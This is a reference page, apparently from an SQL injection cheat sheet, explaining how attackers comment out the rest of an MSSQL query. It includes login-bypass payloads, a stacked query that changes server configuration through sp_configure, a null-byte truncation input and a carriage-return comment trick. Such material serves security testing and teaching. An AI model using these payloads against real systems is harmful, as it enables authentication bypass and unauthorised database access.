---
title: Comment Out Query
description: How to comment out the remainder of a query in MSSQL
category: Basics
order: 2
tags: ["basics", "syntax", "comments"]
lastUpdated: 2026-10-08
---

In SQL injection attacks, commenting out the remainder of a query is often necessary to ensure that the injection payload works correctly without syntax errors. This technique is commonly known as "comment termination."

In Microsoft SQL Server (MSSQL), you can use the following methods to comment out the rest of a query:

| Comment Type         | Syntax    | Description                                                   |
| -------------------- | --------- | ------------------------------------------------------------- |
| Single-line comment  | `--`      | Comments out the rest of the line; no space needed after it   |
| Inline/block comment | `/*...*/` | Can span multiple lines; must be closed (see notes)           |
| Statement terminator | `;`       | Ends the current statement (not a comment); optional in T-SQL |
| Null byte            | `%00`     | Application-layer string truncation (see notes)               |

## Examples

```sql
-- Example 1: Using -- to comment out the rest of the query
SELECT * FROM Users WHERE username = 'admin'-- ' AND password = 'password'

-- Example 2: Using /* */ for inline commenting
SELECT * FROM Users WHERE username = 'admin'/* ' AND password = 'password' */

-- Example 3: Using ; to terminate and start a new query (stacked query)
SELECT * FROM Users WHERE username = 'admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
```

### Example 4: Null byte truncation (application-layer, not SQL Server)

The `%00` null byte is **not** a SQL Server comment — it exploits C-style string handling in certain application frameworks/drivers that treat null bytes as string terminators.

```text
-- Attacker input (URL-encoded):
username=admin'%00&password=anything

-- Application receives and URL-decodes to:
admin'\0  (where \0 is the null byte)

-- The application builds:
SELECT * FROM Users WHERE username = 'admin'\0' AND password = '...'

-- If a C-based layer truncates the query string at the null byte, SQL Server receives:
SELECT * FROM Users WHERE username = 'admin'
```

This technique only works in specific environments (classic ASP, older PHP configurations, certain ODBC drivers). Modern frameworks typically pass the null byte through or reject it. See note 6 below.

## Notes

1. Unlike MySQL, SQL Server does not need a space after `--`: `admin'--` works.
2. A `--` comment ends at a carriage return (`%0D`) as well as at a line feed, so code after `%0D` runs: `' OR 1=1--x%0D AND 1=0` keeps the `AND 1=0`. MySQL, MariaDB and Oracle only end it at a line feed, which lets one payload behave differently per database.
3. An unclosed `/*` is an error (`Missing end comment mark '*/'`), so `/*` only removes the rest of the query when the original query contains a later `*/`. Block comments nest in T-SQL.
4. Comment markers inside a string literal are data, not comments, so the payload must close the string (`'`) before `--` or `/*`.
5. `;` ends a statement; whatever follows runs as an additional statement in the same batch (see [Stacked Queries](/mssql/stacked-queries)). `GO` is a client-tool batch separator, not T-SQL, and does not work in an injection.
6. The null byte (`%00`) does not end a query in SQL Server, which treats it as whitespace (see [Fuzzing and Obfuscation](/mssql/fuzzing-obfuscation)). Truncation happens at the application layer, before the query reaches the database. This behavior depends on the web framework/driver (e.g., classic ASP, certain PHP configurations) and may not work in modern stacks.
